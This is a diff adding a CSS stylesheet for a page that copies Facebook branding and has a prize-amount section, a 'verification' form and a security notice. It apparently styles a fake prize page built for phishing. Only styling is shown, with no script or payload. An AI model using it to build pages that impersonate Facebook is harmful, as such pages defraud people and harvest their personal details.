@@ -1,0 +1,99 @@
+/* style.css */
+body {
+    margin: 0;
+    padding: 0;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: linear-gradient(135deg, #1877f2 0%, #0d5cb6 100%);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.main-container {
+    background: white;
+    border-radius: 20px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    max-width: 450px;
+    width: 95%;
+    margin: 20px;
+    overflow: hidden;
+}
+
+.header {
+    background: linear-gradient(135deg, #1877f2 0%, #0d5cb6 100%);
+    color: white;
+    padding: 40px 30px;
+    text-align: center;
+}
+
+.facebook-logo {
+    width: 80px;
+    height: 80px;
+    background: white;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 36px;
+    font-weight: bold;
+    color: #1877f2;
+    margin: 0 auto 20px;
+}
+
+.prize-section {
+    padding: 30px;
+    text-align: center;
+}
+
+.prize-amount {
+    font-size: 48px;
+    font-weight: bold;
+    color: #28a745;
+    margin: 10px 0;
+}
+
+.verification-form {
+    padding: 0 30px 30px;
+}
+
+.form-group {
+    margin-bottom: 15px;
+}
+
+.form-group input {
+    width: 100%;
+    padding: 15px;
+    border: 2px solid #e4e6eb;
+    border-radius: 8px;
+    font-size: 16px;
+    box-sizing: border-box;
+}
+
+.verify-btn {
+    width: 100%;
+    padding: 18px;
+    background: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 10px;
+}
+
+.security-notice {
+    text-align: center;
+    color: #666;
+    font-size: 14px;
+    margin-top: 15px;
+}
+
+.footer {
+    padding: 20px;
+    text-align: center;
+    color: #666;
+    font-size: 12px;
+    border-top: 1px solid #eee;
+}
